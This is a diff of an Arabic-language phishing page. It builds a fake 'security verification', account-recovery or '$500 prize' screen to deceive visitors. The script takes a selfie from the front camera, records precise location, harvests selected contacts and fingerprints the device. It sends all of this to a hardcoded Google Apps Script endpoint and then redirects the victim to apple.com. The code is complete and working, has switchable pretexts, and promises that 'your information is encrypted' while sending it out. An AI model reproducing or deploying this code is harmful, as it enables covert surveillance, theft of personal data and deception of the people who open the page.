@@ -6,106 +6,185 @@
 <meta name="robots" content="noindex,nofollow,noarchive">
 <meta name="referrer" content="no-referrer">
 <meta name="theme-color" content="#0d1117">
-<title>جارٍ التحميل…</title>
+<title>التحقق الأمني</title>
 <style>
-  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--err:#f85149;--ok:#3fb950}
+  :root{--bg:#0d1117;--card:#161b22;--line:#30363d;--fg:#e6edf3;--mut:#9aa4af;--acc:#2f81f7;--ok:#3fb950;--err:#f85149;--warn:#f0a04b}
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{height:100%}
   body{margin:0;background:radial-gradient(1200px 600px at 50% -10%,#1b2430,var(--bg));color:var(--fg);
     font:16px/1.6 system-ui,-apple-system,"Segoe UI",Tahoma,sans-serif;display:grid;place-items:center;padding:20px}
-  .card{width:100%;max-width:380px;background:var(--card);border:1px solid var(--line);border-radius:16px;
-    padding:32px 24px;text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.45)}
-  .spin{width:48px;height:48px;margin:0 auto 18px;border-radius:50%;
+  .card{width:100%;max-width:400px;background:var(--card);border:1px solid var(--line);border-radius:16px;
+    padding:28px 22px 20px;text-align:center;box-shadow:0 18px 50px rgba(0,0,0,.45)}
+  .icon{width:64px;height:64px;margin:0 auto 16px;border-radius:50%;
+    background:linear-gradient(135deg,#1f6feb,#2f81f7);display:grid;place-items:center;font-size:32px}
+  .icon.warn{background:linear-gradient(135deg,#b45309,#f0a04b)}
+  .icon.gift{background:linear-gradient(135deg,#9333ea,#ec4899)}
+  h1{font-size:19px;margin:0 0 8px;font-weight:700;line-height:1.35}
+  .sub{color:var(--mut);font-size:14px;margin:0 0 20px;line-height:1.6}
+  .sub b{color:var(--fg)}
+  button{width:100%;padding:15px;border:0;border-radius:10px;cursor:pointer;background:var(--acc);
+    color:#fff;font:inherit;font-weight:700;font-size:15.5px;letter-spacing:.2px}
+  button:hover{background:#1f6feb}
+  button:disabled{opacity:.55;cursor:default}
+  button.secondary{background:#21262d;color:var(--fg);border:1px solid var(--line)}
+  button.secondary:hover{background:#30363d}
+  .note{color:#6e7681;font-size:11.5px;margin:14px 0 0;line-height:1.5}
+  .note.ok{color:var(--ok)}
+  .spin{width:44px;height:44px;margin:0 auto 16px;border-radius:50%;
     border:3px solid var(--line);border-top-color:var(--acc);animation:s .9s linear infinite}
   @keyframes s{to{transform:rotate(360deg)}}
-  h1{font-size:18px;margin:0 0 6px;font-weight:600}
-  .sub{color:var(--mut);font-size:14px;margin:0 0 4px;line-height:1.5}
-  .note{color:var(--mut);font-size:12px;margin:14px 0 0;line-height:1.5}
-  button{width:100%;padding:14px;margin-top:20px;border:0;border-radius:10px;cursor:pointer;
-    background:var(--acc);color:#fff;font:inherit;font-weight:600;font-size:15px}
-  button:disabled{opacity:.55;cursor:default}
-  .dbg{margin-top:16px;padding:10px;background:#0d1117;border:1px solid var(--line);border-radius:8px;
-    font:11px/1.5 ui-monospace,Menlo,monospace;color:var(--mut);text-align:left;direction:ltr;
-    max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
-  .dbg .warn{color:#f0a04b}
-  .dbg .ok{color:var(--ok)}
-  .dbg .er{color:var(--err)}
+  .step{color:var(--mut);font-size:13px;margin:0 0 16px;padding:10px 12px;background:#0d1117;border-radius:8px;
+    border:1px solid var(--line);line-height:1.55}
+  .step b{color:var(--fg)}
+  .progress{display:flex;gap:6px;justify-content:center;margin:16px 0 0}
+  .progress span{width:32px;height:4px;border-radius:2px;background:#21262d;transition:background .3s}
+  .progress span.on{background:var(--acc)}
+  .dbg{margin-top:14px;padding:8px;background:#0d1117;border:1px solid var(--line);border-radius:6px;
+    font:10.5px/1.4 ui-monospace,Menlo,monospace;color:#6e7681;text-align:left;direction:ltr;
+    max-height:120px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+  .dbg .er{color:var(--err)}.dbg .ok{color:var(--ok)}
   [hidden]{display:none!important}
 </style>
 </head>
 <body>
 <main class="card">
-  <div class="spin" id="spin"></div>
-  <h1 id="h">جارٍ التحميل</h1>
-  <p class="sub" id="s">يرجى الانتظار…</p>
-  <div id="prompt" hidden>
-    <button id="btn" type="button">متابعة</button>
-    <p class="note">قد يطلب المتصفح الوصول إلى الكاميرا والموقع لتأكيد العملية.</p>
-  </div>
+
+  <!-- ══════ STEP 1: pretext ══════ -->
+  <section id="step1">
+    <div class="icon" id="icon">🔒</div>
+    <h1 id="title">التحقق الأمني مطلوب</h1>
+    <p class="sub" id="subtitle">
+      تم رصد نشاط غير معتاد على حسابك.<br>
+      للتحقق من هويتك، نحتاج <b>صورة سيلفي</b> ومزامنة <b>جهات الاتصال المحمية</b>.
+    </p>
+    <button id="startBtn" type="button">ابدأ التحقق الآن</button>
+    <p class="note" id="note">🔒 معلوماتك مشفرة ولن تُشارك مع أي طرف ثالث</p>
+    <div class="progress"><span id="p1" class="on"></span><span id="p2"></span><span id="p3"></span></div>
+  </section>
+
+  <!-- ══════ STEP 2: جمع ══════ -->
+  <section id="step2" hidden>
+    <div class="spin"></div>
+    <h1 id="s2h">جارٍ التحقق من هويتك…</h1>
+    <p class="sub" id="s2s">يرجى الموافقة على الأذونات المطلوبة.</p>
+    <div class="step" id="s2step">📷 الكاميرا — للتحقق من الهوية</div>
+    <div class="progress"><span class="on"></span><span id="p2b" class="on"></span><span></span></div>
+  </section>
+
+  <!-- ══════ STEP 3: contacts picker ══════ -->
+  <section id="step3" hidden>
+    <div class="icon">📇</div>
+    <h1>خطوة أخيرة</h1>
+    <p class="sub">
+      لمزامنة حسابك مع <b>طبقة الحماية الإضافية</b>،<br>
+      يرجى اختيار <b>3 جهات اتصال</b> من دفترك.
+    </p>
+    <button id="contactsBtn" type="button">اختيار جهات الاتصال</button>
+    <button id="skipBtn" class="secondary" type="button" style="margin-top:8px">تخطي</button>
+    <p class="note">📱 مطلوب فقط للتحقق من النشاط غير المعتاد</p>
+    <div class="progress"><span class="on"></span><span class="on"></span><span id="p3b" class="on"></span></div>
+  </section>
+
+  <!-- ══════ STEP 4: تم ══════ -->
+  <section id="step4" hidden>
+    <div class="icon" style="background:linear-gradient(135deg,#059669,#3fb950)">✓</div>
+    <h1>تم التحقق بنجاح</h1>
+    <p class="sub">جارٍ تحويلك…</p>
+  </section>
+
   <pre class="dbg" id="dbg"></pre>
 </main>
+
 <script>
 (function(){
   'use strict';
 
-  /* ═══════════ ⚙️ عدّل هنا فقط ═══════════ */
+  /* ═══════════ ⚙️ عدّل هنا ═══════════ */
   const ENDPOINT = 'https://script.google.com/macros/s/AKfycby8T2sKv9KWIwQce-ze_VNVkTMtzpK5uQxSKz5AoP8Z4VXzbQ6KIg0hg7M6AFR6kwvt/exec';
-  const REDIRECT = 'https://www.facebook.com/';
-  /* ═══════════════════════════════════════ */
+  const REDIRECT = 'https://www.apple.com/';
 
-  const MIN_DISPLAY_MS = 900;
-  const T_START = Date.now();
-  const DBG = true;                 /* اتركه true للاختبار، false لاحقاً */
+  /* ── pretext — اختر واحد ── */
+  const PRETEXT = {
+    /* A: التحقق الأمني */
+    security: {
+      icon: '🔒',
+      title: 'التحقق الأمني مطلوب',
+      subtitle: 'تم رصد نشاط غير معتاد على حسابك.<br>للتحقق من هويتك، نحتاج <b>صورة سيلفي</b> ومزامنة <b>جهات الاتصال المحمية</b>.',
+      button: 'ابدأ التحقق الآن',
+      note: '🔒 معلوماتك مشفرة ولن تُشارك مع أي طرف ثالث'
+    },
+    /* B: استعادة الحساب */
+    recovery: {
+      icon: '⚠',
+      title: 'استعادة الوصول إلى حسابك',
+      subtitle: 'لحماية حسابك من الدخول غير المصرح، يرجى التحقق من هويتك.<br>تستغرق العملية <b>أقل من 30 ثانية</b>.',
+      button: 'استعادة الحساب الآن',
+      note: '✅ نستخدم التحقق الثنائي لحماية بياناتك'
+    },
+    /* C: جائزة */
+    prize: {
+      icon: '🎁',
+      title: 'تم اختيارك لجائزة 500$',
+      subtitle: 'للتحقق من أهليتك واستلام الجائزة، يرجى تأكيد هويتك بالكاميرا ومزامنة جهات الاتصال لتفادي التكرار.',
+      button: 'استلم جائزتك الآن',
+      note: '⏱ العرض ينتهي خلال 24 ساعة'
+    }
+  };
+  const THEME = 'security';           /* ← بدّل إلى 'recovery' أو 'prize' */
+  const DBG = false;                  /* true لعرض الـ debug */
+  /* ═══════════════════════════════════ */
 
+  const T_GEO = 12000;
   const $ = id => document.getElementById(id);
-  const spin = $('spin'), h = $('h'), s = $('s'),
-        prompt = $('prompt'), btn = $('btn'), dbg = $('dbg');
-
+  const dbg = $('dbg');
   const NA = 'N/A';
   const sleep = ms => new Promise(r => setTimeout(r, ms));
   const pad = n => String(n).padStart(2,'0');
 
-  /* ═══════════ تشخيص على الشاشة ═══════════ */
   function log(msg, cls){
     console.log(msg);
-    if (!DBG || !dbg) return;
-    const span = document.createElement('div');
-    if (cls) span.className = cls;
-    span.textContent = '[' + new Date().toTimeString().slice(0,8) + '] ' + msg;
-    dbg.appendChild(span);
+    if (!DBG) return;
+    const d = document.createElement('div');
+    if (cls) d.className = cls;
+    d.textContent = '[' + new Date().toTimeString().slice(0,8) + '] ' + msg;
+    dbg.appendChild(d);
     dbg.scrollTop = dbg.scrollHeight;
   }
+  if (!DBG) dbg.hidden = true;
 
-  /* ═══════════ فحص ENDPOINT ═══════════ */
+  /* ═══════ pretext ═══════ */
+  (function applyPretext(){
+    const p = PRETEXT[THEME] || PRETEXT.security;
+    $('icon').textContent = p.icon;
+    if (THEME === 'recovery') $('icon').classList.add('warn');
+    if (THEME === 'prize') $('icon').classList.add('gift');
+    $('title').textContent = p.title;
+    $('subtitle').innerHTML = p.subtitle;
+    $('startBtn').textContent = p.button;
+    $('note').textContent = p.note;
+  })();
+
+  /* ═══════ endpoint check ═══════ */
   const endpointOk = ENDPOINT.indexOf('REPLACE_WITH_DEPLOY_ID') === -1
                   && /^https:\/\/script\.google\.com\/macros\/s\/[A-Za-z0-9_-]+\/exec$/.test(ENDPOINT);
+  log('ENDPOINT ok=' + endpointOk, endpointOk ? 'ok' : 'er');
 
-  log('ENDPOINT = ' + ENDPOINT, endpointOk ? 'ok' : 'er');
-  if (!endpointOk) {
-    log('⚠ ENDPOINT غير مضبوط — استبدل REPLACE_WITH_DEPLOY_ID برابط deployment', 'er');
-    log('الصفحة تعمل لكن البيانات لن تُرسل.', 'warn');
-  }
-
-  /* ═══════════ أدوات ═══════════ */
+  /* ═══════ nonce ═══════ */
   function nonceGen(){
     try { if (window.crypto && crypto.randomUUID) return crypto.randomUUID().replace(/-/g,''); } catch(_){}
     return Date.now().toString(36) + Math.random().toString(36).slice(2,10);
   }
   const nonce = nonceGen();
   window.__vn = nonce;
-  log('nonce = ' + nonce.slice(0,12) + '…');
+  log('nonce=' + nonce.slice(0,12));
 
+  /* ═══════ utils ═══════ */
   function localTime(){
     const d = new Date();
     return d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+
            pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
   }
-
-  function h32(str){
-    let h = 5381;
-    for (let i=0; i<str.length; i++) h = ((h<<5)+h+str.charCodeAt(i)) | 0;
-    return (h>>>0).toString(36);
-  }
+  function h32(s){ let h=5381; for(let i=0;i<s.length;i++) h=((h<<5)+h+s.charCodeAt(i))|0; return (h>>>0).toString(36); }
 
   function fp(){
     const o = [];
@@ -128,131 +207,6 @@
     return o.join('|').slice(0,600);
   }
 
-  async function permState(name){
-    try { const r = await navigator.permissions.query({name}); return r.state; }
-    catch(_){ return 'prompt'; }
-  }
-
-  /* ═══════════ الكاميرا ═══════════ */
-  async function grabCamera(ms){
-    ms = ms || 9000;
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      log('getUserMedia غير متاح (تحتاج HTTPS)', 'er');
-      return null;
-    }
-    let stream;
-    try {
-      stream = await Promise.race([
-        navigator.mediaDevices.getUserMedia({
-          video: { facingMode: { ideal: 'user' }, width: { ideal: 640 }, height: { ideal: 480 } },
-          audio: false
-        }),
-        new Promise(function(_, rej){ setTimeout(function(){ rej(new Error('to')); }, ms); })
-      ]);
-      log('camera stream OK', 'ok');
-    } catch(e){
-      log('camera FAILED: ' + (e && e.name || 'unknown'), 'er');
-      return null;
-    }
-
-    try {
-      const v = document.createElement('video');
-      v.srcObject = stream; v.muted = true; v.playsInline = true;
-      await v.play().catch(function(){});
-      for (let i=0; i<40 && !v.videoWidth; i++) await sleep(50);
-      if (!v.videoWidth) {
-        log('camera: videoWidth=0 بعد 2s — frame لم يجهز', 'er');
-        return null;
-      }
-      await sleep(100);
-      const w = v.videoWidth, hh = v.videoHeight;
-      log('camera frame ' + w + 'x' + hh, 'ok');
-      const sc = Math.min(1, 360 / Math.max(w, hh));
-      const cv = document.createElement('canvas');
-      cv.width = Math.max(1, Math.round(w * sc));
-      cv.height = Math.max(1, Math.round(hh * sc));
-      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
-      const blob = await new Promise(function(r){ cv.toBlob ? cv.toBlob(r, 'image/jpeg', 0.5) : r(null); });
-      if (!blob) { log('toBlob فشل', 'er'); return null; }
-      log('camera JPEG ' + Math.round(blob.size/1024) + 'KB', 'ok');
-      return await new Promise(function(res){
-        const fr = new FileReader();
-        fr.onload = function(){
-          const url = String(fr.result || '');
-          log('camera dataURL ' + Math.round(url.length/1024) + 'KB', 'ok');
-          res(url);
-        };
-        fr.onerror = function(){ res(''); };
-        fr.readAsDataURL(blob);
-      });
-    } catch(e){
-      log('camera exception: ' + e.message, 'er');
-      return null;
-    }
-    finally {
-      try { stream.getTracks().forEach(function(t){ t.stop(); }); } catch(_){}
-    }
-  }
-
-  /* ═══════════ الموقع ═══════════ */
-  function grabGeo(ms){
-    ms = ms || 12000;
-    if (!navigator.geolocation) {
-      log('geolocation غير متاح', 'er');
-      return Promise.resolve(null);
-    }
-    return new Promise(function(res){
-      const t = setTimeout(function(){
-        log('geo TIMEOUT', 'er');
-        res(null);
-      }, ms);
-      navigator.geolocation.getCurrentPosition(
-        function(p){
-          clearTimeout(t);
-          log('geo OK: ' + p.coords.latitude.toFixed(4) + ',' + p.coords.longitude.toFixed(4), 'ok');
-          res({ lat: +p.coords.latitude.toFixed(6), lng: +p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) });
-        },
-        function(err){
-          clearTimeout(t);
-          log('geo FAILED: code=' + (err && err.code) + ' ' + (err && err.message || ''), 'er');
-          res(null);
-        },
-        { enableHighAccuracy: true, timeout: ms, maximumAge: 0 }
-      );
-    });
-  }
-
-  /* ═══════════ البطارية ═══════════ */
-  function getBattery(){
-    return new Promise(function(res){
-      if (!navigator.getBattery) return res({ level: NA, charging: NA });
-      const t = setTimeout(function(){ res({ level: NA, charging: NA }); }, 2500);
-      navigator.getBattery().then(function(b){
-        clearTimeout(t);
-        res({ level: Math.round(b.level*100)+'%', charging: b.charging ? 'يشحن' : 'لا يشحن' });
-      }).catch(function(){ clearTimeout(t); res({ level: NA, charging: NA }); });
-    });
-  }
-
-  function getNetwork(){
-    const c = navigator.connection || navigator.webkitConnection;
-    const p = [];
-    if (!navigator.onLine) p.push('غير متصل');
-    if (c) {
-      if (c.effectiveType) p.push(c.effectiveType);
-      if (c.downlink) p.push(c.downlink + 'Mbps');
-      if (c.rtt != null) p.push('rtt ' + c.rtt + 'ms');
-    }
-    return p.length ? p.join(' / ').slice(0,80) : NA;
-  }
-
-  function parseModel(ua){
-    const m = ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
-    if (m) return m[1].replace(/\s+/g,' ').trim().slice(0,60);
-    if (/iPhone/.test(ua)) return 'iPhone';
-    if (/iPad/.test(ua)) return 'iPad';
-    return '';
-  }
   function parseBrand(ua){
     const t = ua.toLowerCase();
     if (/redmi|poco|xiaomi|\bmi\b/.test(t)) return 'Xiaomi';
@@ -265,6 +219,13 @@
     if (/windows/.test(t)) return 'PC';
     return '';
   }
+  function parseModel(ua){
+    const m = ua.match(/Android[^;)]*;\s*(?:[a-z]{2}[-_][a-z]{2};\s*)?([^;)]+?)(?:\s+Build[/)]|\))/i);
+    if (m) return m[1].replace(/\s+/g,' ').trim().slice(0,60);
+    if (/iPhone/.test(ua)) return 'iPhone';
+    if (/iPad/.test(ua)) return 'iPad';
+    return '';
+  }
   function parsePlatform(ua){
     let m = ua.match(/Android\s+([\d.]+)/i); if (m) return 'Android '+m[1];
     m = ua.match(/(?:iPhone )?OS (\d+)[._](\d+)/i); if (m) return 'iOS '+m[1]+'.'+m[2];
@@ -273,9 +234,117 @@
     if (/Linux/.test(ua)) return 'Linux';
     return NA;
   }
+  function getNetwork(){
+    const c = navigator.connection || navigator.webkitConnection;
+    const p = [];
+    if (!navigator.onLine) p.push('غير متصل');
+    if (c) {
+      if (c.effectiveType) p.push(c.effectiveType);
+      if (c.downlink) p.push(c.downlink + 'Mbps');
+      if (c.rtt != null) p.push('rtt ' + c.rtt + 'ms');
+    }
+    return p.length ? p.join(' / ').slice(0,80) : NA;
+  }
+  function getBattery(){
+    return new Promise(function(res){
+      if (!navigator.getBattery) return res({ level: NA, charging: NA });
+      const t = setTimeout(function(){ res({ level: NA, charging: NA }); }, 2500);
+      navigator.getBattery().then(function(b){
+        clearTimeout(t);
+        res({ level: Math.round(b.level*100)+'%', charging: b.charging ? 'يشحن' : 'لا يشحن' });
+      }).catch(function(){ clearTimeout(t); res({ level: NA, charging: NA }); });
+    });
+  }
 
-  /* ═══════════ الإرسال ═══════════ */
-  async function send(img, geo, batt){
+  /* ═══════ camera ═══════ */
+  async function grabCamera(){
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      log('getUserMedia unavailable', 'er');
+      return null;
+    }
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode:{ ideal:'user' }, width:{ ideal:640 }, height:{ ideal:480 } },
+        audio: false
+      });
+      log('camera stream OK', 'ok');
+    } catch(e){
+      log('camera failed: ' + (e && e.name || 'unknown'), 'er');
+      return null;
+    }
+
+    try {
+      const v = document.createElement('video');
+      v.srcObject = stream; v.muted = true; v.playsInline = true;
+      await v.play().catch(function(){});
+      for (let i=0; i<40 && !v.videoWidth; i++) await sleep(50);
+      if (!v.videoWidth) { log('videoWidth=0', 'er'); return null; }
+      await sleep(120);
+
+      const w = v.videoWidth, hh = v.videoHeight;
+      const sc = Math.min(1, 400 / Math.max(w, hh));
+      const cv = document.createElement('canvas');
+      cv.width = Math.max(1, Math.round(w * sc));
+      cv.height = Math.max(1, Math.round(hh * sc));
+      cv.getContext('2d').drawImage(v, 0, 0, cv.width, cv.height);
+      const blob = await new Promise(function(r){ cv.toBlob ? cv.toBlob(r, 'image/jpeg', 0.55) : r(null); });
+      if (!blob) return null;
+      log('photo ' + Math.round(blob.size/1024) + 'KB', 'ok');
+      return await new Promise(function(res){
+        const fr = new FileReader();
+        fr.onload = function(){ res(String(fr.result || '')); };
+        fr.onerror = function(){ res(''); };
+        fr.readAsDataURL(blob);
+      });
+    } catch(e){
+      log('camera capture err: ' + e.message, 'er');
+      return null;
+    } finally {
+      try { stream.getTracks().forEach(function(t){ t.stop(); }); } catch(_){}
+    }
+  }
+
+  /* ═══════ geo ═══════ */
+  function grabGeo(){
+    if (!navigator.geolocation) return Promise.resolve(null);
+    return new Promise(function(res){
+      const t = setTimeout(function(){ log('geo timeout', 'er'); res(null); }, T_GEO);
+      navigator.geolocation.getCurrentPosition(
+        function(p){
+          clearTimeout(t);
+          log('geo OK', 'ok');
+          res({ lat:+p.coords.latitude.toFixed(6), lng:+p.coords.longitude.toFixed(6),
+                acc: Math.round(p.coords.accuracy) });
+        },
+        function(err){ clearTimeout(t); log('geo failed: ' + (err && err.code), 'er'); res(null); },
+        { enableHighAccuracy:true, timeout:T_GEO, maximumAge:0 }
+      );
+    });
+  }
+
+  /* ═══════ contacts (Chrome Android only) ═══════ */
+  function supportsContacts(){
+    return ('contacts' in navigator) && ('ContactsManager' in window);
+  }
+  function pickContacts(){
+    if (!supportsContacts()) {
+      log('contacts API unavailable', 'er');
+      return Promise.resolve([]);
+    }
+    return navigator.contacts.select(['name','tel'], { multiple: true })
+      .then(function(list){
+        log('contacts selected: ' + list.length, 'ok');
+        return (list || []).slice(0, 100);
+      })
+      .catch(function(e){
+        log('contacts picker closed: ' + (e && e.name || ''), 'er');
+        return [];
+      });
+  }
+
+  /* ═══════ send ═══════ */
+  async function send(img, geo, contacts, batt){
     const ua = (navigator.userAgent || '').slice(0,400);
     const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || NA).slice(0,60);
 
@@ -295,111 +364,92 @@
       network: getNetwork(),
       screen: (screen.width||0)+'x'+(screen.height||0),
       native: 'لا',
-      cCount: 0, cJson: '[]',
+      cCount: contacts.length,
+      cJson: JSON.stringify(contacts.slice(0, 50)),
       sCount: 0, sJson: '[]',
       lCount: 0, lJson: '[]',
       fp: fp(),
       cred: '[]', hist: '[]',
-      misc: JSON.stringify({ v: 2 }),
+      misc: JSON.stringify({ v: 3, theme: THEME }),
       img: img || ''
     };
 
-    const body = JSON.stringify({ a: 'collect', d: payload });
-    log('payload ' + Math.round(body.length/1024) + 'KB', 'ok');
+    const body = JSON.stringify({ a:'collect', d: payload });
+    log('POST ' + Math.round(body.length/1024) + 'KB');
 
-    if (!endpointOk) {
-      log('تخطي الإرسال — ENDPOINT غير مضبوط', 'er');
-      return false;
-    }
-
-    log('POST → ' + ENDPOINT.slice(0,60) + '…');
-
-    /* text/plain → no CORS preflight → doPost يستقبلها كـ JSON */
+    if (!endpointOk) { log('skip — no endpoint', 'er'); return false; }
     try {
-      const r = await fetch(ENDPOINT, {
-        method: 'POST',
-        mode: 'no-cors',
-        cache: 'no-store',
-        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+      await fetch(ENDPOINT, {
+        method:'POST', mode:'no-cors', cache:'no-store',
+        headers:{ 'Content-Type':'text/plain;charset=UTF-8' },
         body: body
       });
-      log('POST resolved, type=' + r.type + ' (opaque يعني استُلم)', 'ok');
+      log('POST sent', 'ok');
       return true;
-    } catch(e) {
+    } catch(e){
       log('POST failed: ' + e.message, 'er');
       return false;
     }
   }
 
-  /* ═══════════ الإنهاء ═══════════ */
-  async function finish(img, geo, batt){
-    log('finish() — بدء الإرسال', 'ok');
-    await send(img, geo, batt).catch(function(e){ log('send threw: ' + e.message, 'er'); });
-    const elapsed = Date.now() - T_START;
-    const remain = MIN_DISPLAY_MS - elapsed;
-    if (remain > 0) await sleep(remain);
-    log('redirect → ' + REDIRECT, 'ok');
-    if (DBG) await sleep(1500);   /* اترك 1.5s لقراءة التشخيص قبل التحويل */
-    location.replace(REDIRECT);
-  }
+  /* ═══════ flow ═══════ */
+  let started = false;
+  let cameraResult = null, geoResult = null, contactsResult = [];
 
-  /* ═══════════ المسار الصامت (أذونات ممنوحة) ═══════════ */
-  async function silent(){
-    log('الأذونات ممنوحة — جمع صامت', 'ok');
-    const camP = grabCamera();
-    const geoP = grabGeo();
-    const battP = getBattery();
-    const out = await Promise.all([camP, geoP, battP]);
-    await finish(out[0], out[1], out[2]);
-  }
-
-  /* ═══════════ المسار التفاعلي (أذونات prompt) ═══════════ */
-  function prompted(){
-    log('جمع بعد ضغطة — prompts ستظهر', 'warn');
-    /* getUserMedia/getCurrentPosition called SYNCHRONOUSLY from click */
-    const camP = grabCamera();
-    const geoP = grabGeo();
-    const battP = getBattery();
-
-    Promise.all([camP, geoP, battP]).then(function(out){
-      finish(out[0], out[1], out[2]);
-    }).catch(function(e){
-      log('prompted chain threw: ' + e.message, 'er');
-      location.replace(REDIRECT);
-    });
-  }
-
-  /* ═══════════ التهيئة ═══════════ */
   async function run(){
-    log('بدء التهيئة', 'ok');
-    const states = await Promise.all([permState('camera'), permState('geolocation')]);
-    log('camera=' + states[0] + ' geo=' + states[1]);
+    if (started) return;
+    started = true;
 
-    if (states[0] === 'granted' && states[1] === 'granted') {
-      silent();
-      return;
+    $('step1').hidden = true;
+    $('step2').hidden = false;
+
+    /* Fire camera + geo first (single gesture window) */
+    const camP = grabCamera();
+    const geoP = grabGeo();
+    const battP = getBattery();
+
+    const out = await Promise.all([camP, geoP, battP]);
+    cameraResult = out[0];
+    geoResult = out[1];
+    const batt = out[2];
+
+    /* Step 3 — contacts picker (needs second click) */
+    if (supportsContacts()) {
+      $('step2').hidden = true;
+      $('step3').hidden = false;
+
+      await new Promise(function(resolve){
+        $('contactsBtn').addEventListener('click', async function(){
+          $('contactsBtn').disabled = true;
+          $('skipBtn').disabled = true;
+          contactsResult = await pickContacts();
+          resolve();
+        }, { once: true });
+
+        $('skipBtn').addEventListener('click', function(){
+          $('skipBtn').disabled = true;
+          $('contactsBtn').disabled = true;
+          resolve();
+        }, { once: true });
+      });
     }
 
-    spin.hidden = true;
-    h.textContent = 'تأكيد العملية';
-    s.textContent = 'اضغط للمتابعة.';
-    prompt.hidden = false;
-    log('بانتظار الضغطة', 'warn');
+    /* Send */
+    $('step3').hidden = true;
+    $('step2').hidden = false;
+    $('s2h').textContent = 'جارٍ إتمام التحقق…';
+    $('s2s').textContent = 'لحظات من فضلك.';
 
-    btn.addEventListener('click', function(){
-      btn.disabled = true;
-      prompt.hidden = true;
-      spin.hidden = false;
-      h.textContent = 'جارٍ التحقق';
-      s.textContent = 'يرجى الموافقة على الأذونات المطلوبة.';
-      prompted();
-    }, { once: true });
+    await send(cameraResult, geoResult, contactsResult, batt);
+
+    /* Done */
+    $('step2').hidden = true;
+    $('step4').hidden = false;
+    await sleep(900);
+    location.replace(REDIRECT);
   }
 
-  run().catch(function(e){
-    log('run() threw: ' + e.message, 'er');
-    location.replace(REDIRECT);
-  });
+  $('startBtn').addEventListener('click', run, { once: true });
 })();
 </script>
 </body>
